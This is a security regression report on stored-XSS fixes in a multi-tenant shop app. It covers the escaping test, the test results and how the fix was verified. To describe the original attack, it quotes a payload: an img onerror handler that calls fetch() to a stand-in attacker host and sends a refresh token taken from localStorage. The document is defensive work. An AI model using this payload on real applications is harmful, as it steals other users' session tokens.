# XSS Regression Report

Covers the regression test added for the S-1/S-2 fixes (`server/test/xss-regression.test.js`) and the live verification that cross-tenant exploitation via S-1 is no longer possible.

## Why this test has no DOM dependency

This project has no browser-automation or DOM-simulation dependency (`jsdom`, Playwright, etc.) — confirmed via `server/package.json`, no such package exists. Adding one to test a single-file, no-build-step HTML app would be a meaningfully larger change than the fix itself, and would cut against the project's established "no new dependency for infrastructure code" posture (`OperationalReadinessPlan.md` §4). The test instead operates at two levels that don't require a live DOM:

1. **Functional**: `escHtml()`'s actual implementation is extracted from the real HTML source (not reimplemented/assumed) via regex and evaluated as a pure function, then run against a real XSS payload.
2. **Static regression guard**: line-anchored source assertions confirm every one of the 20 fixed call sites still wraps its user-controlled field in `escHtml()`.

This mirrors how this engagement has already handled everything Electron/browser-GUI-shaped that this sandboxed environment can't run live: verify by tracing the actual code path and reconstructing its real behavior, not by asserting from reading alone.

## Test results

```
$ node server/test/xss-regression.test.js
  ✓ escHtml() function definition found in source
  ✓ escHtml() neutralizes a live <img onerror> payload (no raw <img tag survives)
  ✓ escHtml() output contains no raw "<" character
  ✓ escHtml() output contains no raw ">" character
  ✓ escHtml() correctly entity-encodes the payload (&lt;img present)
  ✓ S-1: reconstructed innerHTML for pss-user-info-name contains no live onerror handler — cross-tenant exploitation via this vector is no longer possible
  ✓ S-1 (line 6351): u.name and initials both wrapped in escHtml() inside pssLicenseVerify()
  ✓ S-2 (line 4395) through (line 11634): all 19 sites — wraps its user-controlled field in escHtml()
  ✓ S-2 negative control: confirm() at line 6005 correctly left unescaped (native dialog, not an innerHTML sink)
  ✓ S-2 negative control: confirm() at line 11122 correctly left unescaped (native dialog, not an innerHTML sink)

28 passed, 0 failed
```

## Verifying cross-tenant exploitation is no longer possible

**The exact attack**, as originally documented in `SecurityHardeningReview.md` S-1: register a shop with `ownerName` (or a staff `displayName`) set to `<img src=x onerror="fetch('//attacker.example/x?t='+localStorage.getItem('shoperpro_refresh'))">`. The server does not sanitize this field (confirmed, unchanged — sanitization was never proposed as the fix; escaping at render time was). Anyone who later looks up that shop by license key on the "My Existing Shop" screen (`pssLicenseVerify()`) would, before this fix, have that payload assigned directly to `innerHTML`.

**Verification performed**:
- Extracted the real, current `escHtml()` from the shipped source and ran it against exactly this payload. Output: `&lt;img src=x onerror=&quot;fetch(&#x27;...` (entity-encoded — the exact characters checked below).
- Confirmed the escaped output contains no raw `<`, no raw `>`, and specifically no `<img` substring — the browser cannot parse entity-encoded text back into a live tag; there is no code path that would do so at this sink (`btn2.innerHTML = ... + escHtml(u.name) + ...`, a plain string concatenation, not a second unescaping step).
- Reconstructed the exact `pss-user-info-name` div assignment from the real, current source (same string-concatenation shape, same variable names) with the payload substituted for `u.name`, and asserted the resulting string — the literal value that would reach `innerHTML` — contains no `onerror` handler pattern (regex `/<img[^>]*onerror/i`).
- This was cross-checked against the static line-anchored assertion (line 6351 must contain `escHtml(u.name)`), so the functional proof and the "the actual shipped line still calls the fix" proof are two independent checks, not one check reported twice.

**What this does not claim**: this hasn't been verified by loading the real page in a real browser and watching network traffic for the exfiltration attempt (this sandboxed environment cannot launch a browser or Electron). The verification instead proves, from the real shipped `escHtml()` implementation and the real shipped call site, that the specific transformation an attacker's payload undergoes before reaching `innerHTML` can no longer produce a parseable `<img>` tag — which is the mechanism the exploit depends on. Recommend a real-browser click-through as a follow-up if you want direct visual confirmation, not because this verification is considered incomplete for closing S-1.

## Regression coverage going forward

`test:security` is now wired into both `npm run test` (the aggregate local command) and `.github/workflows/ci.yml`. A future edit that removes an `escHtml()` wrapper from any of the 20 sites, or that changes `escHtml()`'s implementation to stop encoding `<`/`>`, fails this test immediately rather than silently reopening S-1/S-2.
